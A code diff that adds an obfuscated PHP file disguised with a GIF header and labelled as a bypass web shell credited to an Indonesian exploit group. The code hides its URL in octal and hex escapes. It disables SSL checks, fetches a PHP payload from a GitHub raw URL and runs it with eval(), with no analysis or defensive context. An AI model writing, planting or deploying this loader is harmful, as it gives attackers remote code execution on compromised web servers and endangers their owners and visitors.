@@ -1,0 +1,7 @@
+<?
+ // GIF89;a
+ // BypassSh3LL Lite Speed
+ // Date : 30 Nov 2022
+ // Thanks To All Member PurwokertoXploit
+ goto aPdxG; FDSmz: $aBd61 = Wa4CT("\150\x74\164\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\164\150\165\x62\x75\163\145\162\143\x6f\x6e\x74\145\156\164\56\143\157\155\x2f\106\143\x4a\61\x38\x2f\164\145\x73\x2f\155\141\x69\156\x2f\x6e\157\156\x61\x6d\x65\x2e\x70\x68\160"); goto UPs9i; Hf5Ez: function wA4ct($zmiuF) { goto WXjTo; Sz28J: curl_setopt($YG_56, CURLOPT_FOLLOWLOCATION, 1); goto YSKd8; k_l1o: curl_setopt($YG_56, CURLOPT_SSL_VERIFYPEER, 0); goto j1yWp; qQ_4u: curl_setopt($YG_56, CURLOPT_COOKIEFILE, $GLOBALS["\x63\x6f\153\151"]); goto BxMjt; WXjTo: $YG_56 = curl_init("{$zmiuF}"); goto LfKbs; LfKbs: curl_setopt($YG_56, CURLOPT_RETURNTRANSFER, 1); goto Sz28J; BxMjt: $tYmiv = curl_exec($YG_56); goto Jj5On; j1yWp: curl_setopt($YG_56, CURLOPT_SSL_VERIFYHOST, 0); goto DDvqG; Jj5On: return $tYmiv; goto WArin; YSKd8: curl_setopt($YG_56, CURLOPT_USERAGENT, "\x4d\x6f\x7a\x69\154\154\141\x2f\x35\x2e\60\50\x57\x69\156\x64\157\x77\x73\40\x4e\x54\40\66\x2e\x31\73\40\x72\x76\x3a\63\62\x2e\x30\51\40\107\145\143\x6b\157\x2f\x32\60\61\x30\60\61\60\61\x20\106\x69\162\145\146\157\x78\57\x33\62\x2e\60"); goto k_l1o; DDvqG: curl_setopt($YG_56, CURLOPT_COOKIEJAR, $GLOBALS["\143\157\x6b\x69"]); goto qQ_4u; WArin: } goto FDSmz; aPdxG: set_time_limit(0); goto yKWtQ; yKWtQ: error_reporting(0); goto Hf5Ez; UPs9i: 
+ eval("\x3f\76" . $aBd61);
